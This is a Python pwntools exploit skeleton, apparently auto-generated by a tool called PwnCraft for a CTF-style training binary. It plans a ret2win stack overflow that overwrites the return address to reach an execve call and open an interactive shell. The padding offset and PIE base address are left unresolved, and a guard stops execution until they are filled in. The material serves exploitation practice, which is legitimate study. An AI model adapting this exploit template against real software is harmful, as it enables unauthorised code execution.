"""PwnCraft 自动生成 EXP 骨架 — 确定性事实渲染，必须人工复核后使用。

strategy    : ret2win（ret2win（跳过程序内现成调用点））  status=blocked
target      : F:\pwn宝\pwncraft\artifacts\gw-training\intelpwn\challenge_pie  sha256=9f5e8ae9f4b3df9b…  amd64/64-bit  endian=little
mitigations : PIE=ON NX=ON CANARY=OFF RELRO=PARTIAL FORTIFY=OFF
provenance  : DERIVED（ELF 字节 / objdump / 重定位；离线、无模型推断）
evidence    :
  - 0x1190: call execve
  - 参数地址 0x2017
  - stack_truth=missing
gaps        :
  - 控制流劫持偏移未证明（需要崩溃/调试证据）
  - PIE 已开启但无基址泄漏事实
unresolved  :
  - OFFSET（到保存返回地址的填充长度）
"""
from pwn import *

TARGET = 'F:\\pwn宝\\pwncraft\\artifacts\\gw-training\\intelpwn\\challenge_pie'
context.binary = elf = ELF(TARGET, checksec=False)
context.log_level = "info"

BASE = 0x0            # UNRESOLVED: PIE 基址需先泄漏
OFFSET = 0x0            # UNRESOLVED: cyclic / 调试器确认的填充长度
RET = BASE + 0x1016
WIN = BASE + 0x1169

UNRESOLVED = ['OFFSET（到保存返回地址的填充长度）']

def exploit():
    if UNRESOLVED:
        raise SystemExit("补齐 UNRESOLVED 常量后再运行: " + ", ".join(UNRESOLVED))
    io = process(TARGET)
    payload = flat({OFFSET: [p64(RET), p64(WIN)]})
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
